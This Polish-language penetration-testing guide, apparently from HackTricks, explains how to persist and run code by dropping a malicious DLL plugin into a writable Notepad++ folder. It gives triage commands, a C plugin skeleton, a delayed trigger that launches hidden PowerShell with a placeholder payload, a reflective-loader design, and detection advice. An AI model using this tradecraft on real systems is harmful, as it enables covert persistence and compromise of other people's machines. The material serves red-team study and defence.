# Trwałość i uruchamianie kodu przez automatyczne ładowanie pluginów Notepad++

{{#include ../../banners/hacktricks-training.md}}

Notepad++ **automatycznie ładuje wszystkie biblioteki DLL pluginów znalezione w podfolderach `plugins`** podczas uruchamiania. Umieszczenie złośliwego pluginu w dowolnej **zapisywalnej instalacji Notepad++** pozwala na wykonanie kodu w `notepad++.exe` przy każdym uruchomieniu edytora. Można to wykorzystać do **utrzymania dostępu**, ukrytego **początkowego wykonania kodu** lub jako **loadera wewnątrz procesu**, jeśli edytor zostanie uruchomiony z podwyższonymi uprawnieniami.<sup>[[1]](#references)</sup>

Od **Notepad++ 7.6+** oczekiwany układ ręcznej instalacji to **osobny podfolder dla każdego pluginu** (`plugins\<PluginName>\<PluginName>.dll`). W **trybie portable** (gdy obok `notepad++.exe` znajduje się `doLocalConf.xml`) całe drzewo aplikacji pozostaje lokalnie w tym katalogu, co często sprawia, że skopiowane pakiety narzędzi administracyjnych stają się łatwo dostępnym dla użytkownika obszarem do wykonywania kodu.<sup>[[2]](#references)</sup>

## Zapisywalne lokalizacje pluginów

- Standardowa instalacja: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (zwykle zapis wymaga uprawnień administratora).<sup>[[1]](#references)</sup>
- Zapisywalne opcje dla operatorów z niskimi uprawnieniami:<sup>[[1]](#references)</sup>
  - Użyj **przenośnej wersji Notepad++** w folderze, w którym użytkownik ma uprawnienia do zapisu.
  - Skopiuj `C:\Program Files\Notepad++` do ścieżki kontrolowanej przez użytkownika (np. `%LOCALAPPDATA%\npp\`) i uruchom stamtąd `notepad++.exe`.
  - Poszukaj **pakietów narzędzi administracyjnych**, rozpakowanych kopii z archiwów zip lub zestawów narzędzi help desku, które zawierają już `doLocalConf.xml` i znajdują się poza `Program Files`.
- Każdy plugin ma własny podfolder w `plugins` i jest automatycznie ładowany podczas uruchamiania; pozycje menu pojawiają się w sekcji **Plugins**.<sup>[[2]](#references)</sup>

Szybka triage:

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## Punkty ładowania wtyczki (prymitywy wykonania)
Notepad++ oczekuje określonych **eksportowanych funkcji**. Wszystkie są wywoływane podczas inicjalizacji, co zapewnia wiele punktów wykonania:<sup>[[1]](#references)</sup>
- **`DllMain`** — uruchamia się natychmiast po załadowaniu DLL (pierwszy punkt wykonania).
- **`setInfo(NppData)`** — wywoływana raz podczas ładowania, aby przekazać uchwyty Notepad++; typowe miejsce do rejestrowania pozycji menu.
- **`getName()`** — zwraca nazwę wtyczki wyświetlaną w menu.
- **`getFuncsArray(int *nbF)`** — zwraca polecenia menu; jest wywoływana podczas uruchamiania nawet wtedy, gdy jest pusta.
- **`beNotified(SCNotification*)`** — odbiera zdarzenia Notepad++ / Scintilla (przydatna do odroczenia payloadów do czasu działania użytkownika lub zdarzenia edytora).
- **`messageProc(UINT, WPARAM, LPARAM)`** — procedura obsługi komunikatów, przydatna do większej wymiany danych.
- **`isUnicode()`** — flaga zgodności sprawdzana podczas ładowania.

Większość eksportów można zaimplementować jako **puste funkcje**; wykonanie może nastąpić w `DllMain` lub dowolnej z powyższych funkcji zwrotnych podczas autoload.

## Minimalny szkielet złośliwej wtyczki
Skompiluj DLL z oczekiwanymi eksportami i umieść ją w `plugins\\MyNewPlugin\\MyNewPlugin.dll` w zapisywalnym folderze Notepad++:<sup>[[1]](#references)</sup>

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. Zbuduj DLL (Visual Studio/MinGW).
2. Utwórz podfolder wtyczki w `plugins` i umieść w nim DLL.
3. Uruchom ponownie Notepad++; DLL zostanie automatycznie załadowana, uruchamiając `DllMain` i kolejne callbacks.

## Wzorzec wyzwalania o niskim poziomie szumu przez `beNotified`
Ze względu na OPSEC wiele payloadów **nie powinno** uruchamiać się z `DllMain`. Dyskretniejszy wzorzec polega na tym, by pozwolić wtyczce załadować się bez problemów, a następnie wykonać kod dopiero po realistycznym zdarzeniu edytora, takim jak **zakończenie uruchamiania**, **aktywacja bufora** lub **wpisanie pierwszego znaku**.

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

To lepiej odpowiada publicznym badaniom ofensywnym niż głośny beacon w `DllMain`: DLL nadal jest automatycznie ładowana podczas uruchamiania, ale złośliwe działanie zostaje opóźnione do chwili, gdy Notepad++ wygląda na faktycznie używany.

## Użycie katalogu konfiguracji pluginów jako dodatkowego miejsca przechowywania
Notepad++ udostępnia `NPPM_GETPLUGINSCONFIGDIR`, które zwraca **katalog konfiguracji pluginów bieżącego użytkownika**.<sup>[[3]](#references)</sup> Złośliwy plugin może użyć tej funkcji, aby ograniczyć do minimum zawartość DLL na dysku, przechowując zaszyfrowaną konfigurację, przygotowane payloady lub pliki z zadaniami w ścieżce, która wtapia się w typowe pliki stanu pluginów.

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

Operacyjnie jest to przydatne, gdy chcesz:
- małą, automatycznie ładowaną DLL bootstrapującą;
- tasking dla poszczególnych użytkowników bez ponownego modyfikowania głównego pliku binarnego pluginu;
- oddzielić **wyzwalacz autoload** od większego drugiego etapu.

## Wzorzec pluginu Reflective Loader
Uzbrojony plugin może zmienić Notepad++ w **reflective DLL loader**:<sup>[[1]](#references)</sup>
- Udostępniać minimalny interfejs UI/wpis menu (np. „LoadDLL”).
- Przyjmować **ścieżkę pliku** lub **URL**, z którego pobierana będzie DLL z payloadem.
- Mapować DLL do bieżącego procesu metodą reflective i wywoływać eksportowany punkt wejścia (np. funkcję loadera wewnątrz pobranej DLL).
- Zaleta: ponowne użycie procesu GUI, który wygląda na nieszkodliwy, zamiast uruchamiania nowego loadera; payload dziedziczy poziom integralności `notepad++.exe` (w tym konteksty z podwyższonymi uprawnieniami).
- Kompromisy: zapisanie na dysku **niepodpisanej DLL pluginu** jest łatwe do wykrycia; praktycznym wariantem jest użycie automatycznie ładowanego pluginu wyłącznie jako stubu, a przechowywanie właściwego implantu w postaci zaszyfrowanej lub etapowanej w innym miejscu.

## Uwagi dotyczące wykrywania i hardeningu
- Blokuj lub monitoruj **zapisy w katalogach pluginów Notepad++** (w tym przenośnych kopiach w profilach użytkowników); włącz kontrolowany dostęp do folderów lub allowlisting aplikacji.
- Generuj alerty dotyczące **nowych niepodpisanych DLL** w katalogach `plugins`, zmian w przenośnych drzewach Notepad++ oraz nietypowych **procesów potomnych/aktywności sieciowej** z `notepad++.exe`.
- Utwórz bazowy wykaz legalnych pluginów i sprawdzaj każdą nową DLL, która eksportuje standardowy interfejs pluginu Notepad++, ale także uruchamia powłoki, PowerShell lub wysyła sygnały beacon przez sieć.
- Wymuszaj instalowanie pluginów wyłącznie przez **Plugins Admin** i ograniczaj wykonywanie przenośnych kopii z niezaufanych ścieżek.

## References

- [1] [TrustedSec - Pluginy Notepad++: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Podręcznik użytkownika Notepad++ - Wtyczki](https://npp-user-manual.org/docs/plugins/)
- [3] [Podręcznik użytkownika Notepad++ - Komunikacja z pluginami](https://npp-user-manual.org/docs/plugin-communication/)
{{#include ../../banners/hacktricks-training.md}}
